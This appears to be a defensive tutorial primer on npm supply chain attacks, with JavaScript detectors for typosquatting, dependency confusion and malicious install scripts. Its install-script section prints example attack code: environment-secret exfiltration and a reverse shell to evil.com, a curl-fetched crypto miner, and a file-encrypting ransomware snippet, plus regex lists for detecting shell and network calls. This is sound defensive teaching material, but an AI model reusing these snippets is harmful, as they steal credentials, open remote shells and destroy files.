# Primer 5: Understanding Supply Chain Attack Patterns

Welcome to the fifth primer of our tutorial series. This primer provides a comprehensive overview of real-world supply chain attack patterns, how they work, and how our security scanner detects them. Understanding these attack patterns is essential for building effective defenses.

---

## The Supply Chain Attack Landscape

### Attack Taxonomy

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SUPPLY CHAIN ATTACK TAXONOMY                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1. PACKAGE CONFUSION                                                       │
│  ┌──────────────────────────────────────────────────────────────────────┐  │
│  │  • Typosquatting - Similar names to popular packages                │  │
│  │  • Dependency Confusion - Public versions of internal packages      │  │
│  │  • Brandjacking - Company/product name registration                 │  │
│  └──────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  2. CODE INJECTION                                                          │
│  ┌──────────────────────────────────────────────────────────────────────┐  │
│  │  • Malicious Scripts - Install/postinstall scripts                  │  │
│  │  • Prototype Pollution - Modifying object prototypes                │  │
│  │  • Backdoor Injection - Hidden remote access                        │  │
│  └──────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  3. MANIFEST TAMPERING                                                      │
│  ┌──────────────────────────────────────────────────────────────────────┐  │
│  │  • Version Hijacking - Publishing malicious versions                │  │
│  │  • Dependency Substitution - Replacing dependencies                 │  │
│  │  • Lock File Poisoning - Falsifying integrity hashes                │  │
│  └──────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  4. SOCIAL ENGINEERING                                                      │
│  ┌──────────────────────────────────────────────────────────────────────┐  │
│  │  • Maintainer Compromise - Stealing maintainer credentials          │  │
│  │  • Phishing - Fake security alerts                                  │  │
│  │  • Extortion - Threatening to compromise packages                  │  │
│  └──────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 1. Package Confusion Attacks

### Typosquatting in Detail

```javascript
/**
 * TYPOSQUATTING: The Complete Attack Pattern
 * Understanding how typosquatting works
 */

const typosquattingAnalysis = {
    // How it works
    attackFlow: {
        steps: [
            '1. Identify popular package (e.g., express)',
            '2. Create similar name (e.g., expreess, expres)',
            '3. Publish malicious package with same structure',
            '4. Wait for developers to make typos',
            '5. Malicious code executes on install'
        ]
    },

    // Common typosquatting strategies
    strategies: {
        letterSwap: {
            description: 'Swap adjacent letters',
            examples: [
                'exrpess -> express',
                'lo dash -> lodash',
                'reac t -> react'
            ]
        },
        missingLetter: {
            description: 'Remove a letter',
            examples: [
                'exress -> express',
                'lodah -> lodash',
                'react -> react'
            ]
        },
        extraLetter: {
            description: 'Add an extra letter',
            examples: [
                'exxpress -> express',
                'loadash -> lodash',
                'reactt -> react'
            ]
        },
        suffixAddition: {
            description: 'Add common suffixes',
            examples: [
                'express-latest',
                'express-core',
                'express-js',
                'express-node'
            ]
        },
        prefixAddition: {
            description: 'Add common prefixes',
            examples: [
                'node-express',
                'js-express',
                'core-express'
            ]
        },
        hyphenVariation: {
            description: 'Add or remove hyphens',
            examples: [
                'ex-press',
                'expresss',
                'ex-presss'
            ]
        }
    },

    // Real-world examples
    realWorldExamples: [
        {
            package: 'exprees',
            impersonates: 'express',
            date: '2023',
            impact: 'Stole environment variables'
        },
        {
            package: 'loash',
            impersonates: 'lodash',
            date: '2022',
            impact: 'Installed cryptocurrency miner'
        },
        {
            package: 'reactt',
            impersonates: 'react',
            date: '2021',
            impact: 'Data exfiltration'
        },
        {
            package: 'anglar',
            impersonates: 'angular',
            date: '2023',
            impact: 'Backdoor installation'
        }
    ]
};

// Example: Typosquatting detection algorithm
class TyposquattingDetector {
    constructor() {
        // Popular packages to check against
        this.popularPackages = [
            'express', 'react', 'vue', 'angular', 'lodash', 'axios',
            'typescript', 'webpack', 'babel', 'eslint', 'prettier',
            'jest', 'mocha', 'chai', 'sinon', 'cypress', 'puppeteer',
            'node', 'npm', 'yarn', 'next', 'nuxt', 'svelte'
        ];

        // Common typosquatting patterns
        this.suspiciousPatterns = [
            /^[a-zA-Z0-9]*-$/,           // Trailing hyphen
            /^[a-zA-Z0-9]*\./,            // Contains dot
            /^[a-zA-Z0-9]*js$/,          // Ends with 'js'
            /^[a-zA-Z0-9]*node$/,        // Ends with 'node'
            /^[a-zA-Z0-9]*core$/,        // Ends with 'core'
            /^[a-zA-Z0-9]*lib$/,         // Ends with 'lib'
            /^[a-zA-Z0-9]*s$/,           // Pluralization
            /^[a-zA-Z0-9]*2$/,           // Numeric suffix
            /^[a-zA-Z0-9]*3$/,
            /^[a-zA-Z0-9]*4$/,
            /^[a-zA-Z0-9]*latest$/,      // 'latest' suffix
            /^[a-zA-Z0-9]*stable$/,      // 'stable' suffix
            /^[a-zA-Z0-9]*?js$/,         // 'js' suffix
            /^[a-zA-Z0-9]*?node$/        // 'node' suffix
        ];
    }

    detect(packageName) {
        const findings = [];
        
        // 1. Check against popular packages
        for (const popular of this.popularPackages) {
            const similarity = this.calculateSimilarity(packageName, popular);
            
            if (similarity > 0.7 && packageName !== popular) {
                findings.push({
                    resembles: popular,
                    similarity,
                    type: 'Name Similarity',
                    severity: similarity > 0.9 ? 'CRITICAL' : 'HIGH',
                    confidence: similarity > 0.9 ? 0.95 : 0.8
                });
            }
        }

        // 2. Check for suspicious patterns
        for (const pattern of this.suspiciousPatterns) {
            if (pattern.test(packageName)) {
                findings.push({
                    pattern: pattern.toString(),
                    type: 'Suspicious Pattern',
                    severity: 'MEDIUM',
                    confidence: 0.6
                });
            }
        }

        // 3. Check for common typosquatting techniques
        const techniques = this.detectTechniques(packageName);
        if (techniques.length > 0) {
            findings.push({
                techniques,
                type: 'Typosquatting Techniques',
                severity: 'HIGH',
                confidence: 0.7
            });
        }

        return findings;
    }

    calculateSimilarity(str1, str2) {
        // Levenshtein distance with normalization
        const distance = this.levenshteinDistance(str1.toLowerCase(), str2.toLowerCase());
        const maxLength = Math.max(str1.length, str2.length);
        return 1 - (distance / maxLength);
    }

    levenshteinDistance(str1, str2) {
        const matrix = Array(str2.length + 1)
            .fill(null)
            .map(() => Array(str1.length + 1).fill(null));

        for (let i = 0; i <= str1.length; i++) {
            matrix[0][i] = i;
        }
        for (let j = 0; j <= str2.length; j++) {
            matrix[j][0] = j;
        }

        for (let j = 1; j <= str2.length; j++) {
            for (let i = 1; i <= str1.length; i++) {
                const indicator = str1[i - 1] === str2[j - 1] ? 0 : 1;
                matrix[j][i] = Math.min(
                    matrix[j][i - 1] + 1,
                    matrix[j - 1][i] + 1,
                    matrix[j - 1][i - 1] + indicator
                );
            }
        }

        return matrix[str2.length][str1.length];
    }

    detectTechniques(name) {
        const techniques = [];
        const lower = name.toLowerCase();

        // Letter swap detection
        for (let i = 0; i < lower.length - 1; i++) {
            const swapped = lower.slice(0, i) + lower[i + 1] + lower[i] + lower.slice(i + 2);
            if (this.popularPackages.some(p => p.toLowerCase() === swapped)) {
                techniques.push({
                    type: 'Letter Swap',
                    at: i,
                    swapped: swapped
                });
            }
        }

        // Missing letter detection
        for (let i = 0; i < lower.length; i++) {
            const missing = lower.slice(0, i) + lower.slice(i + 1);
            if (this.popularPackages.some(p => p.toLowerCase() === missing)) {
                techniques.push({
                    type: 'Missing Letter',
                    at: i,
                    missing: missing
                });
            }
        }

        // Extra letter detection
        for (let i = 0; i <= lower.length; i++) {
            for (const letter of 'abcdefghijklmnopqrstuvwxyz') {
                const extra = lower.slice(0, i) + letter + lower.slice(i);
                if (this.popularPackages.some(p => p.toLowerCase() === extra)) {
                    techniques.push({
                        type: 'Extra Letter',
                        at: i,
                        letter,
                        extra: extra
                    });
                }
            }
        }

        return techniques;
    }

    // Generate a report for a package
    generateReport(packageName) {
        const findings = this.detect(packageName);
        const riskScore = this.calculateRiskScore(findings);

        return {
            package: packageName,
            findings,
            riskScore,
            riskLevel: this.riskScoreToLevel(riskScore),
            summary: {
                totalFindings: findings.length,
                bySeverity: {
                    CRITICAL: findings.filter(f => f.severity === 'CRITICAL').length,
                    HIGH: findings.filter(f => f.severity === 'HIGH').length,
                    MEDIUM: findings.filter(f => f.severity === 'MEDIUM').length,
                    LOW: findings.filter(f => f.severity === 'LOW').length
                }
            },
            recommendations: this.generateRecommendations(findings)
        };
    }

    calculateRiskScore(findings) {
        const severityWeights = {
            CRITICAL: 30,
            HIGH: 20,
            MEDIUM: 10,
            LOW: 5
        };

        let score = 0;
        for (const finding of findings) {
            score += (severityWeights[finding.severity] || 5) * finding.confidence;
        }

        return Math.min(score, 100);
    }

    riskScoreToLevel(score) {
        if (score >= 60) return 'CRITICAL';
        if (score >= 40) return 'HIGH';
        if (score >= 20) return 'MEDIUM';
        return 'LOW';
    }

    generateRecommendations(findings) {
        const recommendations = [];

        if (findings.some(f => f.severity === 'CRITICAL')) {
            recommendations.push({
                priority: 'CRITICAL',
                action: 'BLOCK',
                message: 'High likelihood of typosquatting - block this package',
                detail: 'Package name is extremely similar to a popular package'
            });
        }

        if (findings.some(f => f.severity === 'HIGH')) {
            recommendations.push({
                priority: 'HIGH',
                action: 'REVIEW',
                message: 'Package name suspicious - require manual review',
                detail: 'Package name uses common typosquatting techniques'
            });
        }

        return recommendations;
    }
}
```

### Dependency Confusion in Detail

```javascript
/**
 * DEPENDENCY CONFUSION: The Complete Attack Pattern
 * Understanding dependency confusion attacks
 */

const dependencyConfusionAnalysis = {
    // How it works
    attackFlow: {
        steps: [
            '1. Identify internal package name (e.g., @company/auth)',
            '2. Publish same name to public registry (without scope)',
            '3. Use higher version number (e.g., 999.0.0)',
            '4. npm install picks public version over private',
            '5. Malicious code executes'
        ]
    },

    // Conditions for successful attack
    conditions: {
        privatePackage: 'Package is internal/private',
        unscopedName: 'Package name is unscoped (no @company/)',
        publicRegistry: 'Package resolves to public registry',
        versionConflict: 'Public version is higher than private'
    },

    // Real-world examples
    realWorldExamples: [
        {
            company: 'TechCorp',
            package: 'internal-utils',
            impact: 'Stole internal source code'
        },
        {
            company: 'FinTech',
            package: 'auth-service',
            impact: 'Compromised authentication tokens'
        },
        {
            company: 'HealthTech',
            package: 'data-processor',
            impact: 'Exfiltrated patient data'
        }
    ],

    // Mitigation strategies
    mitigation: {
        scopedPackages: 'Use scoped packages (@company/package)',
        privateRegistry: 'Configure private registry for internal packages',
        npmrcConfig: 'Configure .npmrc with registry priority',
        versionPinning: 'Pin exact versions in package.json',
        lockFiles: 'Use lock files for deterministic installs'
    }
};

// Example: Dependency confusion detection
class DependencyConfusionDetector {
    constructor() {
        this.suspiciousVersionPatterns = [
            /^999\.0\.0$/,
            /^9999\.0\.0$/,
            /^999\.\d+\.\d+$/,
            /^9999\.\d+\.\d+$/,
            /^999\.\d+\.\d+-\w+$/,
            /^9999\.\d+\.\d+-\w+$/,
            /^999\.\d+\.\d+\+.*$/,
            /^9999\.\d+\.\d+\+.*$/
        ];
    }

    analyzePackage(packageJson) {
        const findings = [];
        
        // 1. Check if package is private
        if (!packageJson.private) {
            return findings;
        }

        // 2. Check if package uses scoped dependencies
        const dependencies = {
            ...packageJson.dependencies,
            ...packageJson.devDependencies,
            ...packageJson.peerDependencies
        };

        for (const [name, version] of Object.entries(dependencies)) {
            // Check for unscoped dependencies in private packages
            if (!name.startsWith('@') && this.isPopularPackage(name)) {
                findings.push({
                    type: 'Dependency Confusion Risk',
                    package: name,
                    version,
                    severity: 'HIGH',
                    description: `Private package uses unscoped dependency "${name}"`,
                    recommendation: `Scope the dependency: @company/${name}`
                });
            }

            // Check for suspicious version numbers
            if (this.isSuspiciousVersion(version)) {
                findings.push({
                    type: 'Suspicious Version',
                    package: name,
                    version,
                    severity: 'CRITICAL',
                    description: `Dependency "${name}" uses suspicious version "${version}"`,
                    recommendation: 'Pin to a specific, known-good version'
                });
            }
        }

        // 3. Check for private registry configuration
        if (!this.hasPrivateRegistry(packageJson)) {
            findings.push({
                type: 'Missing Private Registry',
                severity: 'MEDIUM',
                description: 'Package may resolve to public registry',
                recommendation: 'Configure private registry in .npmrc'
            });
        }

        return findings;
    }

    isPopularPackage(name) {
        const popular = [
            'express', 'react', 'vue', 'angular', 'lodash', 'axios',
            'typescript', 'webpack', 'babel', 'eslint', 'prettier'
        ];
        return popular.includes(name);
    }

    isSuspiciousVersion(version) {
        return this.suspiciousVersionPatterns.some(pattern => pattern.test(version));
    }

    hasPrivateRegistry(packageJson) {
        return packageJson.publishConfig &&
               packageJson.publishConfig.registry &&
               !packageJson.publishConfig.registry.includes('npmjs.org');
    }

    generateReport(packageJson, packageName) {
        const findings = this.analyzePackage(packageJson);
        
        return {
            package: packageName,
            isPrivate: packageJson.private || false,
            findings,
            riskScore: this.calculateRiskScore(findings),
            riskLevel: this.riskScoreToLevel(findings),
            recommendations: findings.map(f => f.recommendation)
        };
    }

    calculateRiskScore(findings) {
        const severityWeights = {
            CRITICAL: 35,
            HIGH: 20,
            MEDIUM: 10,
            LOW: 5
        };

        let score = 0;
        for (const finding of findings) {
            score += severityWeights[finding.severity] || 5;
        }

        return Math.min(score, 100);
    }

    riskScoreToLevel(findings) {
        const score = this.calculateRiskScore(findings);
        if (score >= 50) return 'CRITICAL';
        if (score >= 30) return 'HIGH';
        if (score >= 15) return 'MEDIUM';
        return 'LOW';
    }
}
```

---

## 2. Code Injection Attacks

### Malicious Install Scripts

```javascript
/**
 * MALICIOUS INSTALL SCRIPTS: Attack Patterns
 * Understanding how install scripts are exploited
 */

const maliciousInstallScripts = {
    // Attack categories
    categories: {
        dataExfiltration: {
            description: 'Stealing sensitive data',
            techniques: [
                'Environment variable collection',
                'File system scanning',
                'Network exfiltration'
            ],
            script: `
                // Example: Environment variable exfiltration
                const https = require('https');
                const env = process.env;
                
                // Collect sensitive environment variables
                const sensitive = {
                    NODE_ENV: env.NODE_ENV,
                    DATABASE_URL: env.DATABASE_URL,
                    API_KEY: env.API_KEY,
                    JWT_SECRET: env.JWT_SECRET,
                    AWS_ACCESS_KEY: env.AWS_ACCESS_KEY
                };
                
                // Send to attacker's server
                https.get('https://evil.com/collect?data=' + 
                    encodeURIComponent(JSON.stringify(sensitive)));
            `
        },

        backdoorInstallation: {
            description: 'Installing persistent backdoors',
            techniques: [
                'Startup script injection',
                'Cron job creation',
                'SSH key installation',
                'Reverse shell setup'
            ],
            script: `
                // Example: Reverse shell
                const net = require('net');
                const cp = require('child_process');
                
                const sh = cp.spawn('/bin/sh', []);
                const client = new net.Socket();
                
                client.connect(4444, 'evil.com', () => {
                    client.pipe(sh.stdin);
                    sh.stdout.pipe(client);
                    sh.stderr.pipe(client);
                });
            `
        },

        cryptoMining: {
            description: 'Installing cryptocurrency miners',
            techniques: [
                'Download miner binary',
                'Configure mining pool',
                'Run miner in background'
            ],
            script: `
                // Example: Cryptocurrency mining
                const { exec } = require('child_process');
                
                // Download and run miner
                const minerUrl = 'https://evil.com/xmrig';
                const wallet = '46x...';
                const pool = 'pool.evil.com:4444';
                
                exec(\`curl -s \${minerUrl} > /tmp/xmrig && chmod +x /tmp/xmrig\`);
                exec(\`/tmp/xmrig -o \${pool} -u \${wallet} -t 4\`, {
                    detached: true,
                    stdio: 'ignore'
                }).unref();
            `
        },

        ransom: {
            description: 'Ransomware or extortion',
            techniques: [
                'File encryption',
                'System lock',
                'Data deletion'
            ],
            script: `
                // Example: File encryption
                const fs = require('fs');
                const crypto = require('crypto');
                
                function encryptFile(filePath) {
                    const key = crypto.randomBytes(32);
                    const iv = crypto.randomBytes(16);
                    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
                    
                    const data = fs.readFileSync(filePath);
                    const encrypted = Buffer.concat([
                        cipher.update(data),
                        cipher.final()
                    ]);
                    
                    fs.writeFileSync(filePath + '.encrypted', encrypted);
                    fs.unlinkSync(filePath);
                }
                
                // Encrypt important files
                const importantFiles = [
                    'package.json',
                    'README.md',
                    '.env'
                ];
                
                for (const file of importantFiles) {
                    if (fs.existsSync(file)) {
                        encryptFile(file);
                    }
                }
            `
        }
    },

    // Detection patterns
    detectionPatterns: {
        environmentAccess: [
            /process\.env/,
            /env\./,
            /environment/i
        ],
        networkAccess: [
            /http\.(get|request)/,
            /https\.(get|request)/,
            /fetch\s*\(/,
            /axios\./,
            /\.connect\s*\(/,
            /\.createConnection\s*\(/
        ],
        filesystemAccess: [
            /fs\./,
            /readFile/,
            /writeFile/,
            /createReadStream/,
            /createWriteStream/,
            /mkdir/,
            /rmdir/,
            /unlink/
        ],
        shellExecution: [
            /child_process\./,
            /exec\s*\(/,
            /spawn\s*\(/,
            /fork\s*\(/,
            /execSync\s*\(/,
            /spawnSync\s*\(/
        ],
        persistence: [
            /startup/i,
            /cron/i,
            /init/i,
            /service/i,
            /systemd/i,
            /launchd/i,
            /registry/i
        ]
    },

    // Risk scoring
    riskScoring: {
        categories: [
            { name: 'shellExecution', weight: 20 },
            { name: 'networkAccess', weight: 15 },
            { name: 'filesystemAccess', weight: 10 },
            { name: 'persistence', weight: 10 },
            { name: 'environmentAccess', weight: 5 }
        ]
    }
};

// Example: Malicious script detector
class MaliciousScriptDetector {
    constructor() {
        this.patterns = maliciousInstallScripts.detectionPatterns;
        this.riskCategories = maliciousInstallScripts.riskScoring.categories;
    }

    analyzeScript(scriptContent, scriptName) {
        const detections = [];
        let riskScore = 0;

        // Check each pattern category
        for (const [category, patterns] of Object.entries(this.patterns)) {
            const matches = [];
            
            for (const pattern of patterns) {
                const regex = new RegExp(pattern, 'g');
                const found = scriptContent.match(regex);
                if (found) {
                    matches.push({
                        pattern: pattern.toString(),
                        count: found.length,
                        examples: found.slice(0, 3)
                    });
                }
            }

            if (matches.length > 0) {
                const weight = this.getCategoryWeight(category);
                riskScore += matches.reduce((sum, m) => sum + (m.count * weight), 0);
                
                detections.push({
                    category,
                    matches,
                    severity: this.getSeverity(weight),
                    count: matches.length
                });
            }
        }

        return {
            scriptName,
            detections,
            riskScore: Math.min(riskScore, 100),
            riskLevel: this.riskScoreToLevel(riskScore),
            isMalicious: riskScore > 30
        };
    }

    getCategoryWeight(category) {
        const mapping = {
            shellExecution: 20,
            networkAccess: 15,
            filesystemAccess: 10,
            persistence: 10,
            environmentAccess: 5
        };
        return mapping[category] || 5;
    }

    getSeverity(weight) {
        if (weight >= 15) return 'CRITICAL';
        if (weight >= 10) return 'HIGH';
        if (weight >= 5) return 'MEDIUM';
        return 'LOW';
    }

    riskScoreToLevel(score) {
        if (score >= 60) return 'CRITICAL';
        if (score >= 40) return 'HIGH';
        if (score >= 20) return 'MEDIUM';
        return 'LOW';
    }

    generateReport(scripts) {
        const report = {
            totalScripts: scripts.length,
            maliciousScripts: scripts.filter(s => s.isMalicious).length,
            findings: scripts.map(s => ({
                name: s.scriptName,
                riskScore: s.riskScore,
                riskLevel: s.riskLevel,
                detections: s.detections
            })),
            summary: {
                byRiskLevel: {
                    CRITICAL: scripts.filter(s => s.riskLevel === 'CRITICAL').length,
                    HIGH: scripts.filter(s => s.riskLevel === 'HIGH').length,
                    MEDIUM: scripts.filter(s => s.riskLevel === 'MEDIUM').length,
                    LOW: scripts.filter(s => s.riskLevel === 'LOW').length
                }
            },
            recommendations: this.generateRecommendations(scripts)
        };

        return report;
    }

    generateRecommendations(scripts) {
        const recommendations = [];

        const criticalScripts = scripts.filter(s => s.riskLevel === 'CRITICAL');
        if (criticalScripts.length > 0) {
            recommendations.push({
                priority: 'CRITICAL',
                action: 'BLOCK',
                message: `${criticalScripts.length} scripts have critical risk`,
                scripts: criticalScripts.map(s => s.scriptName)
            });
        }

        const highScripts = scripts.filter(s => s.riskLevel === 'HIGH');
        if (highScripts.length > 0) {
            recommendations.push({
                priority: 'HIGH',
                action: 'REVIEW',
                message: `${highScripts.length} scripts have high risk`,
                scripts: highScripts.map(s => s.scriptName)
            });
        }

        return recommendations;
    }
}
```

---

## 3. Manifest Tampering

### Version Hijacking

```javascript
/**
 * VERSION HIJACKING: Attack Patterns
 * Understanding version-based attacks
 */

const versionHijacking = {
    // Attack types
    types: {
        versionBump: {
            description: 'Publishing a malicious version with same version number',
            example: `
                // Package version 1.0.0 exists (clean)
                // Attacker publishes 1.0.0 (malicious)
                // npm install gets malicious version
            `,
            detection: 'Compare integrity hashes of same version'
        },

        versionConfusion: {
            description: 'Publishing with version number that causes confusion',
            example: `
                // Package versions: 1.0.0, 1.0.1, 1.1.0
                // Attacker publishes 2.0.0-alpha (pre-release)
                // Semver considers it lower than 2.0.0
                // May cause unexpected installations
            `,
            detection: 'Check for pre-release versions in production'
        },

        dependencySubstitution: {
            description: 'Substituting a dependency with a malicious version',
            example: `
                // Package A depends on Package B
                // Attacker publishes malicious Package B
                // Package A installs malicious Package B
            `,
            detection: 'Check for unexpected dependency version changes'
        }
    },

    // Detection strategies
    detectionStrategies: {
        integrityCheck: {
            description: 'Verify package integrity hash matches expected',
            implementation: `
                // Check integrity of installed package
                const crypto = require('crypto');
                
                function verifyIntegrity(packageName, expectedHash) {
                    const packagePath = \`node_modules/\${packageName}\`;
                    const hash = calculateHash(packagePath);
                    return hash === expectedHash;
                }
            `
        },
        
        versionHistory: {
            description: 'Check version history for anomalies',
            implementation: `
                // Check for suspicious version patterns
                function checkVersionHistory(versions) {
                    const suspicious = [];
                    
                    // Check for large version jumps
                    for (let i = 1; i < versions.length; i++) {
                        const diff = semver.diff(versions[i-1], versions[i]);
                        if (diff === 'major' && i < versions.length - 1) {
                            suspicious.push({
                                version: versions[i],
                                reason: 'Unusual major version bump'
                            });
                        }
                    }
                    
                    return suspicious;
                }
            `
        }
    }
};
```

---

## 4. Social Engineering

### Maintainer Compromise

```javascript
/**
 * MAINTAINER COMPROMISE: Attack Patterns
 * Understanding social engineering attacks on maintainers
 */

const maintainerCompromise = {
    // Attack vectors
    vectors: {
        phishing: {
            description: 'Fake security alerts or notifications',
            example: `
                // Attacker sends email:
                // "URGENT: Security vulnerability found in your package"
                // "Click here to fix" -> phish page
            `,
            prevention: 'Use 2FA, verify communications'
        },

        credentialTheft: {
            description: 'Stealing npm credentials',
            examples: [
                'Malicious package that reads npmrc',
                'Keylogger in development tools',
                'Compromised CI/CD environment'
            ],
            prevention: 'Never store tokens in code, use environment variables'
        },

        impersonation: {
            description: 'Impersonating npm or other trusted entities',
            example: `
                // Attacker pretends to be npm security team
                // Asks maintainer to verify identity
                // Steals 2FA code or token
            `,
            prevention: 'Verify identities, use official channels'
        },

        extortion: {
            description: 'Threatening to compromise or expose vulnerabilities',
            example: `
                // Attacker finds vulnerability
                // Threatens to disclose unless paid
                // Or threatens to publish malicious version
            `,
            prevention: 'Have responsible disclosure policy, don't pay ransoms'
        }
    },

    // Detection indicators
    indicators: {
        accountActivity: [
            'Unusual login locations',
            'Multiple login attempts',
            'Login from new devices',
            'Changes to account settings'
        ],
        packageActivity: [
            'Unexpected version publishes',
            'Publish from unusual IPs',
            'New maintainers added',
            'Package ownership changes',
            'Deprecation of packages'
        ],
        repositoryActivity: [
            'Unexpected commits',
            'New collaborators added',
            'CI/CD configuration changes',
            'Package.json changes'
        ]
    },

    // Prevention measures
    prevention: {
        npm: [
            'Enable 2FA for publishing',
            'Use automation tokens with limited scope',
            'Regular security audits',
            'Monitor npm account activity'
        ],
        github: [
            'Enable 2FA',
            'Use branch protection rules',
            'Require code reviews',
            'Use signed commits'
        ],
        general: [
            'Use strong, unique passwords',
            'Regular security awareness training',
            'Implement security policy',
            'Have incident response plan'
        ]
    }
};
```

---

## Summary

| Attack Type | Description | Detection | Prevention |
|-------------|-------------|-----------|------------|
| **Typosquatting** | Similar names to popular packages | Name similarity analysis | Use lock files, verify package names |
| **Dependency Confusion** | Public versions of private packages | Check scope, registry configuration | Use scoped packages, private registries |
| **Malicious Scripts** | Malicious install/postinstall scripts | Behavioral pattern detection | Use --ignore-scripts, audit scripts |
| **Version Hijacking** | Malicious versions of packages | Integrity verification, version history | Pin versions, verify integrity |
| **Maintainer Compromise** | Compromised maintainer credentials | Monitor account activity | Enable 2FA, security training |
